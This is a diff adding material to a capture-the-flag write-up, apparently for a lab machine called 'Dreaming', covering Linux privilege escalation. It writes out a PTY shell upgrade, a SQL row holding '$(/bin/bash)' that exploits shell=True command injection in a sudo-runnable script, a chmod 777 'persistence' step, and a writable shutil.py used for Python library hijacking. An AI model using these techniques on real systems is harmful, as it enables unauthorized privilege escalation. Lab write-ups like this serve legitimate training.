@@ -274,7 +274,11 @@ when we did sudo -l
 I got
 
 sudo: a terminal is required to read the password; either use the -S option to read from standard input or configure an askpass helper
+
+``` python
 $ python3 -c 'import pty; pty.spawn("/bin/bash")'  
+
+```
 
 Meaning we need to make it a proper shell.
 
@@ -994,6 +998,8 @@ Now we're going to enumurate here and there in this ssh shell.
 
 When doing so i somehow looked into the file .bash_history and founded the mysql pass of user lucien.
 
+![bash History](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ftlwpjzv91ed9sog1sxui.png)
+
 After logging in into the mysql when i did 
 
 ```mysql
@@ -1025,17 +1031,304 @@ the content inside it was
 4 rows in set (0.00 sec)
 ```
 
+
+![mysql](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Ffvup30xo270kw7ly59ne.png)
+
+
 When i did sudo -l in current terminal of ssh that is of lucien.
+
 
 I got this entry
 
+
  (death) NOPASSWD: /usr/bin/python3 /home/death/getDreams.py
+
+
 
 and inside the file .bash_histroy too i got a line executing this command 
 
+
+
 This command inside the .bash_history
 
+
+```bash
 sudo -u death /usr/bin/python3 /home/death/getDreams.py
+```
 
 Meaning we could execute the file /home/death/getDreams.py as the root dream user without any password.
 
+But for now it is not happening when i do so.
+
+So we will look the getDreams file more closely
+
+![get dreams 1](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F7h01l3wekne480nrf0a5.png)
+
+
+![get dreams 2](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2F7h01l3wekne480nrf0a5.png)
+
+
+Now Looking at the code, the following vulnerability is observed Command Injection. The combination between the user input and shell=True results into a high risk of command injection. Basically, as a malicious actor can alter the integrity of the database by creating the name of the dreamer and instead of a legitimate input (like, the dream- Want to become a famous singer 🎤), would provide a command, with the final result of breaching the confidentiality. 
+
+
+We are going to exploit that vulnebility by adding a new column in sql database of dreams.
+
+
+With the command
+
+```sql
+INSERT INTO dreams VALUE ("martin","$(/bin/bash)");
+```
+
+Since see before it when we're executing 
+
+```bash
+sudo -u death /usr/bin/python3 /home/death/getDreams.py
+
+```
+
+We were only getting 
+
+
+ | Alice   | Flying in the sky                  |
+ | Bob     | Exploring ancient ruins            |
+ | Carol   | Becoming a successful entrepreneur |
+ | Dave    | Becoming a professional musician  
+
+But since now we have inserted a new row so it should also be fetched which will lead in command execution.
+
+Now after inserting that row when we execute that command
+
+We got the shell as a user death.
+
+
+We're going to ensure lucien has the privilege to run getDreams.py script by running chmod 777 getDreams.py. Essentially, this gives read, write, execute permissions, thus establishing persistence.
+
+![chmod](https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.amazonaws.com%2Fuploads%2Farticles%2Fios9h00kngywbs9vjxql.png)
+
+Since we have now the shell as death so i tried why not get the password now 
+
+But when i did cat death_flag.txt
+
+It prompted back me nothing.
+
+So this is not the way to get the flag.
+
+Since we have set the permission to 777 meaningly the user lucien has full permit to that getDreams.py file.
+
+
+So we are now exiting the death shell and read the content of getDreams file as the user lucien.
+
+
+And this time when we read the read the file stored in /home/death that is 
+
+getDreams.py
+
+
+It contains the pass.
+
+
+so i loggedin as death with 
+
+```bash
+su death
+```
+
+And we are now prompted to enter pass after entering the extracted pass we got the access and now we're ready to get the flag.
+
+![death flag](https://miro.medium.com/v2/resize:fit:640/format:webp/1*AVkmKOrNy0wa000uyO8FAA.png)
+
+Now its time for privilage escalation to the last user morpheus.
+
+
+for this when we checked for the content inside the folder morpheus
+
+- kingdom
+- morpheus_glag.txt
+- restore.py
+
+the content inside the restore.py was 
+
+```python3
+from shutil import copy2 as backup
+
+src_file = "/home/morpheus/kingdom"
+dst_file = "/kingdom_backup/kingdom"
+
+backup(src_file, dst_file)
+print("The kingdom backup has been done!")
+```
+
+Since we will also have not the permission to edit the file restore.py
+
+So we need to find something else.
+
+Now i tried to do manual privilage escalation we need to manually find misconfigured binaries.
+
+first method to do is to check for file that are writable by user death(current user).
+
+We will do it with command below
+
+find / -writable -type f 2>/dev/null | grep -v 'proc'
+
+Filtering proc cuz it full the ssh minimal terminal.
+
+The noticable outputs are
+
+```bash
+/opt/getDreams.py
+/home/death/.viminfo
+/home/death/.mysql_history
+/home/death/getDreams.py
+/home/death/.bash_history
+/home/death/.wget-hsts
+/home/death/.profile
+/home/death/.bash_logout
+/home/death/death_flag.txt
+/home/death/.bashrc
+```
+
+But all files are 
+
+```bash
+/var/www/html/app/pluck-4.7.13/data/settings/token.php
+/var/www/html/app/pluck-4.7.13/data/settings/install.dat
+/var/www/html/app/pluck-4.7.13/data/settings/langpref.php
+/var/www/html/app/pluck-4.7.13/data/settings/update_lastcheck.php
+/var/www/html/app/pluck-4.7.13/data/settings/pages/1.dreaming.php
+/var/www/html/app/pluck-4.7.13/data/settings/themepref.php
+/var/www/html/app/pluck-4.7.13/data/settings/pass.php
+/var/www/html/app/pluck-4.7.13/data/settings/options.php
+/usr/lib/python3.8/shutil.py
+/sys/kernel/security/apparmor/.remove
+/sys/kernel/security/apparmor/.replace
+/sys/kernel/security/apparmor/.load
+/sys/kernel/security/apparmor/.access
+/sys/fs/cgroup/memory/user.slice/cgroup.event_control
+/sys/fs/cgroup/memory/user.slice/user-1000.slice/user@1000.service/cgroup.event_control
+/sys/fs/cgroup/memory/user.slice/user-1000.slice/session-25.scope/cgroup.event_control
+/sys/fs/cgroup/memory/user.slice/user-1000.slice/cgroup.event_control
+/sys/fs/cgroup/memory/user.slice/user-1000.slice/session-49.scope/cgroup.event_control
+/sys/fs/cgroup/memory/cgroup.event_control
+/sys/fs/cgroup/memory/init.scope/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/irqbalance.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/amazon-ssm-agent.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-update-utmp.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-sysusers.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/cloud-init-hotplugd.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-systemd\x2dfsck.slice/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-systemd\x2dfsck.slice/systemd-fsck@dev-disk-by\x2duuid-b754eeb7\x2d3381\x2d430c\x2d9d1b\x2deec196ee0930.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/apache2.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/iscsid.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-udevd-control.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/lvm2-monitor.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-journal-flush.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-sysctl.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-networkd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snapd.apparmor.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-udevd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-udevd-kernel.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/finalrd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/cron.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/sys-fs-fuse-connections.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/serial-getty@ttyS0.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-serial\x2dgetty.slice/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-networkd-wait-online.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/boot.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/sys-kernel-config.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/polkit.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-remount-fs.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/networkd-dispatcher.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/sys-kernel-debug.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/lvm2-lvmpolld.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/multipathd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/accounts-daemon.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-tmpfiles-setup.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/-.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-modprobe.slice/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-journald-dev-log.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/ModemManager.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/cloud-init-local.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-networkd.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/console-setup.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snap-lxd-32662.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-journald.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/atd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-udev-trigger.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/unattended-upgrades.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-rfkill.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/ssh.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/syslog.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/dev-mqueue.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-initctl.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snapd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/ufw.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-random-seed.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/dbus.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-journald-audit.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snap-snapd-23771.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/cloud-final.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snapd.seeded.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/mysql.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/uuidd.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/run-snapd-ns.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/rsyslog.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-modules-load.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/blk-availability.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/rc-local.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-udev-settle.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/sys-kernel-tracing.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-tmpfiles-setup-dev.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-fsckd.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/cloud-config.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snap-core20-1974.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snap-lxd-24061.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-journald.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snapd.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/kmod-static-nodes.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snap-core20-2015.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/apport.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/apparmor.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-resolved.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snap-snapd-20290.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-lvm2\x2dpvscan.slice/lvm2-pvscan@259:4.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-lvm2\x2dpvscan.slice/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/cloud-init.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/multipathd.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/udisks2.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/dev-hugepages.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/dbus.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-timesyncd.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-getty.slice/getty@tty1.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/system-getty.slice/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/run-snapd-ns-lxd.mnt.mount/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/keyboard-setup.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-user-sessions.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/dm-event.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/systemd-logind.service/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/snap.lxd.daemon.unix.socket/cgroup.event_control
+/sys/fs/cgroup/memory/system.slice/setvtrgb.service/cgroup.event_control
+/opt/getDreams.py
+/home/death/.viminfo
+/home/death/.mysql_history
+/home/death/getDreams.py
+/home/death/.bash_history
+/home/death/.wget-hsts
+/home/death/.profile
+/home/death/.bash_logout
+/home/death/death_flag.txt
+/home/death/.bashrc
+```
+
+![misconfigured binaries](https://miro.medium.com/v2/resize:fit:720/format:webp/1*KLlDRRYySUcnZeT9KTM0YA.png)
+
+
+![misconfigured binaries 2](https://miro.medium.com/v2/resize:fit:640/format:webp/1*W-hkXShJD0F4uEIE-DMB8g.png)
+
+Notice the file shutil.py.
+
+
+Which was also inside the file /home/morpheus/restore.py
+
+Meaning if the file shutil.py is writable by user death meaning we could intentionally control the file restore.py.
